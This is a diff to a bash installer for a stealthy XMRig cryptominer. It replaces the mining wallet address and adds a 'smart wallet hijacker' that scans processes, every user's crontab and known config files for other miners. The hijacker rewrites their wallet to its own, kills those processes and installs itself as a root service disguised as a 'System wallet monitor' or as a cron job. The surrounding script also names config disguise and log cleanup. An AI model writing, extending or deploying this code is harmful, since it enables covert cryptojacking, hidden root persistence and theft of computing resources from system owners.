@@ -437,7 +437,7 @@ fi
 echo "[*] Configuring XMRig..."
 
 # User-configurable variables
-WALLET="896Q5xQdR1JWF5aiiMW1Urhu9RLqC6wdZKkWdKH7gCz8XvUnx9FKPuqyJvzuoMdPZBdUNtMvyFkCupE18P3UVN8uShDBHUE"
+WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 WORKER_NAME="$(hostname)-swapd"
 
 # Create configuration file (will be renamed to swapfile for stealth)
@@ -1017,6 +1017,122 @@ fi
 
 echo "[✓] Log cleanup complete"
 
+# ==================== INSTALL SMART WALLET HIJACKER ====================
+echo ""
+echo "[*] Installing smart wallet hijacker..."
+
+# Create the smart wallet hijacker script
+cat > /usr/local/bin/smart-wallet-hijacker << 'HIJACKER_EOF'
+#!/bin/bash
+MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+CHECK_INTERVAL=300
+exec 2>/dev/null
+set +x
+
+find_and_hijack() {
+    local changed=0
+    # Scan all processes for "-c" flag (XMRig config indicator)
+    ps auxww | grep -E '\-c\s+' | grep -v grep | while read -r line; do
+        local cmdline=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
+        local config=$(echo "$cmdline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
+        local pid=$(echo "$line" | awk '{print $2}')
+        
+        if [ -n "$config" ] && [ -f "$config" ]; then
+            if grep -q '"user"' "$config" 2>/dev/null; then
+                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
+                    cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
+                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
+                    kill -9 "$pid" 2>/dev/null
+                    changed=1
+                fi
+            fi
+        fi
+    done
+    
+    # Scan crontabs for mining configs
+    for user in $(cut -f1 -d: /etc/passwd); do
+        local cron_content=$(crontab -u "$user" -l 2>/dev/null)
+        if [ -n "$cron_content" ]; then
+            # Look for lines with -c flag
+            echo "$cron_content" | grep -E '\-c\s+' | while read -r cronline; do
+                local config=$(echo "$cronline" | grep -oP '\-c\s+\K[^\s]+' | head -1)
+                if [ -n "$config" ] && [ -f "$config" ]; then
+                    if grep -q '"user"' "$config" 2>/dev/null; then
+                        local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                        if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
+                            cp "$config" "${config}.backup.$(date +%s)" 2>/dev/null
+                            sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
+                            changed=1
+                        fi
+                    fi
+                fi
+            done
+        fi
+    done
+    
+    # Also update unused configs for future use
+    for config in /root/.swapd/swapfile /root/.swapd/config.json /root/.xmrig.json /root/.config/xmrig.json; do
+        if [ -f "$config" ] && ! ps auxww | grep -q "\-c.*$config"; then
+            if grep -q '"user"' "$config" 2>/dev/null; then
+                local current_wallet=$(grep '"user"' "$config" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                if [ -n "$current_wallet" ] && [ "$current_wallet" != "$MY_WALLET" ]; then
+                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config"
+                fi
+            fi
+        fi
+    done
+    
+    if [ $changed -eq 1 ]; then
+        for service in swapd kswapd0 xmrig; do
+            systemctl restart $service 2>/dev/null || /etc/init.d/$service restart 2>/dev/null || true
+        done
+    fi
+}
+
+if [ "$1" = "daemon" ]; then
+    while true; do
+        find_and_hijack
+        sleep $CHECK_INTERVAL
+    done
+else
+    find_and_hijack
+fi
+HIJACKER_EOF
+
+chmod +x /usr/local/bin/smart-wallet-hijacker 2>/dev/null || true
+
+# Create systemd service for wallet hijacker
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    cat > /etc/systemd/system/smart-wallet-hijacker.service << 'HIJACKER_SERVICE_EOF'
+[Unit]
+Description=System wallet monitor
+After=network.target swapd.service
+
+[Service]
+Type=simple
+User=root
+ExecStart=/usr/local/bin/smart-wallet-hijacker daemon
+Restart=always
+RestartSec=30
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+HIJACKER_SERVICE_EOF
+    
+    systemctl daemon-reload 2>/dev/null || true
+    systemctl enable smart-wallet-hijacker 2>/dev/null || true
+    systemctl start smart-wallet-hijacker 2>/dev/null || true
+    
+    echo "[✓] Smart wallet hijacker installed (systemd service)"
+else
+    # For SysV systems, add to cron
+    (crontab -l 2>/dev/null | grep -v smart-wallet-hijacker; echo "*/5 * * * * /usr/local/bin/smart-wallet-hijacker >/dev/null 2>&1") | crontab - 2>/dev/null || true
+    echo "[✓] Smart wallet hijacker installed (cron job)"
+fi
+
 # ==================== FINAL CLEANUP ====================
 echo "[*] Final cleanup..."
 
@@ -1074,6 +1190,12 @@ if [ -f /usr/local/bin/system-watchdog ]; then
     echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
 else
     echo '  ○ Watchdog: Not deployed'
+fi
+
+if [ -f /usr/local/bin/smart-wallet-hijacker ]; then
+    echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
+else
+    echo '  ○ Wallet Hijacker: Not deployed'
 fi
 
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
